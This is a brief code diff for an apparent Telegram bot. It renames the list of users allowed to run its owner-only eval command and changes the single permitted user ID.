@@ -50,11 +50,11 @@ async def edit_or_reply(msg: Message, **kwargs):
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
-GREY = [1784606556]    
+BAGAS = [6051457085]    
 
 @app.on_message(
     filters.command(["eval", "e", "ev"], [".", "-", "!", "^", ";", ":", "/"])
-    & filters.user(GREY)
+    & filters.user(BAGAS)
     & ~filters.forwarded
     & ~filters.via_bot
 )
